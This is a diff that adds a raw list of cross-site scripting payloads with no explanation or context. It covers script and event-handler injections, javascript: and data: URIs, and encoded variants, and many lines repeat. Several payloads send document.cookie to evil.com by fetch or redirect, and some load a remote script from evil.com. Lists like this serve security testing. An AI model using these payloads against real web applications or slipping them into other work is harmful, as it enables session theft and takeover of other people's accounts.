@@ -1,0 +1,148 @@
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+"><img src="javascript:alert('XSS')">
+"><svg onload=alert('XSS')>
+"><body onload=alert('XSS')>
+"><iframe src=javascript:alert('XSS')>
+"><input onfocus=alert('XSS') autofocus>
+"><div onmouseover=alert('XSS')>Hover me!</div>
+"><a href="javascript:alert('XSS')">Click me</a>
+"><audio onloadstart=alert('XSS')>
+"><video src=1 onerror=alert('XSS')>
+"><details open ontoggle=alert('XSS')>
+"><marquee onstart=alert('XSS')>
+"><object data=javascript:alert('XSS')>
+"><embed src=javascript:alert('XSS')>
+"><script>alert(document.domain)</script>
+"><img src=x onerror="window.location='https://evil.com/?cookie='+document.cookie">
+"><xss id=x tabindex=1 onclick=alert(1)></xss>
+"><math><mtext></mtext><mtext><script>alert('XSS')</script></mtext></math>
+"><form><button formaction=javascript:alert('XSS')>CLICKME
+"><script src=//evil.com/xss.js></script>
+"><img src=x onerror=this.src='//evil.com/xss.js'>
+"><svg/onload=fetch('https://evil.com/?cookie='+document.cookie)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><body onload=setTimeout('alert(1)',10)>
+"><math><mtext></mtext><mtext><script>alert('XSS')</script></mtext></math>
+"><form><button formaction=javascript:alert('XSS')>CLICKME
+"><xss id=x tabindex=1 onclick=alert(1)></xss>
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+"><script src=//evil.com/xss.js></script>
+"><img src=x onerror=this.src='//evil.com/xss.js'>
+"><svg/onload=fetch('https://evil.com/?cookie='+document.cookie)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><body onload=setTimeout('alert(1)',10)>
+"><math><mtext></mtext><mtext><script>alert('XSS')</script></mtext></math>
+"><form><button formaction=javascript:alert('XSS')>CLICKME
+"><xss id=x tabindex=1 onclick=alert(1)></xss>
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+<script>String.fromCharCode(88,83,83)</script>
+"><img src="javascript:String.fromCharCode(88,83,83)">
+"><svg onload=String.fromCharCode(88,83,83)>
+"><body onload=String.fromCharCode(88,83,83)>
+"><iframe src=javascript:String.fromCharCode(88,83,83)>
+"><input onfocus=String.fromCharCode(88,83,83) autofocus>
+"><div onmouseover=String.fromCharCode(88,83,83)>Hover me!</div>
+"><a href="javascript:String.fromCharCode(88,83,83)">Click me</a>
+"><audio onloadstart=String.fromCharCode(88,83,83)>
+"><video src=1 onerror=String.fromCharCode(88,83,83)>
+"><details open ontoggle=String.fromCharCode(88,83,83)>
+"><marquee onstart=String.fromCharCode(88,83,83)>
+"><object data=javascript:String.fromCharCode(88,83,83)>
+"><embed src=javascript:String.fromCharCode(88,83,83)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><img src=x onerror="window.location='https://evil.com/?cookie='+document.cookie">
+"><script src=//evil.com/xss.js></script>
+"><img src=x onerror=this.src='//evil.com/xss.js'>
+"><svg/onload=fetch('https://evil.com/?cookie='+document.cookie)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><body onload=setTimeout('alert(1)',10)>
+"><math><mtext></mtext><mtext><script>alert('XSS')</script></mtext></math>
+"><form><button formaction=javascript:alert('XSS')>CLICKME
+"><xss id=x tabindex=1 onclick=alert(1)></xss>
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+%22%3E%3Cimg%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E
+%22%3E%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E
+%22%3E%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E
+%22%3E%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E
+%22%3E%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E
+%22%3E%3Cdiv%20onmouseover%3Dalert%28%27XSS%27%29%3EHover%20me!%3C%2Fdiv%3E
+%22%3E%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20me%3C%2Fa%3E
+%22%3E%3Ca%20href%3D%22data:text/html%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%22%3EClick%20me%3C%2Fa%3E
+%22%3E%3Ca%20href%3D%22data:text/html;base64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3EClick%20me%3C%2Fa%3E
+%22%3E%3Cimg%20src%3D%22data:image/svg+xml%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%2Fsvg%3E%22%3E
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+%22%3E%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%22%3E%3Cimg%20src%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E
+%22%3E%3Cobject%20data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E%3C%2Fobject%3E
+%22%3E%3Cembed%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E%3C%2Fembed%3E
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+%22%3E%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%22%3E%3Cimg%20src%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E
+%22%3E%3Cobject%20data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E%3C%2Fobject%3E
+%22%3E%3Cembed%20src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4%3D%22%3E%3C%2Fembed%3E
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
+<script>alert(‘\u0058\u0053\u0053’)</script>
+"><img src="javascript:alert(‘\u0058\u0053\u0053’)">
+"><svg onload=alert(‘\u0058\u0053\u0053’)>
+"><body onload=alert(‘\u0058\u0053\u0053’)>
+"><iframe src=javascript:alert(‘\u0058\u0053\u0053’)>
+"><input onfocus=alert(‘\u0058\u0053\u0053’) autofocus>
+"><div onmouseover=alert(‘\u0058\u0053\u0053’)>Hover me!</div>
+"><a href="javascript:alert(‘\u0058\u0053\u0053’)">Click me</a>
+"><audio onloadstart=alert(‘\u0058\u0053\u0053’)>
+"><video src=1 onerror=alert(‘\u0058\u0053\u0053’)>
+"><details open ontoggle=alert(‘\u0058\u0053\u0053’)>
+"><marquee onstart=alert(‘\u0058\u0053\u0053’)>
+"><object data=javascript:alert(‘\u0058\u0053\u0053’)>
+"><embed src=javascript:alert(‘\u0058\u0053\u0053’)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><img src=x onerror="window.location='https://evil.com/?cookie='+document.cookie">
+"><script src=//evil.com/xss.js></script>
+"><img src=x onerror=this.src='//evil.com/xss.js'>
+"><svg/onload=fetch('https://evil.com/?cookie='+document.cookie)>
+"><script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+"><body onload=setTimeout('alert(1)',10)>
+"><math><mtext></mtext><mtext><script>alert('XSS')</script></mtext></math>
+"><form><button formaction=javascript:alert('XSS')>CLICKME
+"><xss id=x tabindex=1 onclick=alert(1)></xss>
+"><marquee onstart=alert('XSS')>
+"><details open ontoggle=alert(1)>
+"><video onerror="javascript:alert(1)">
+"><div onmouseover=alert(1)>Hover me!</div>
+"><input onfocus=alert(1) autofocus>
+"><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+"><svg><foreignObject><![CDATA[</foreignObject><script>alert(1)</script>]]></svg>
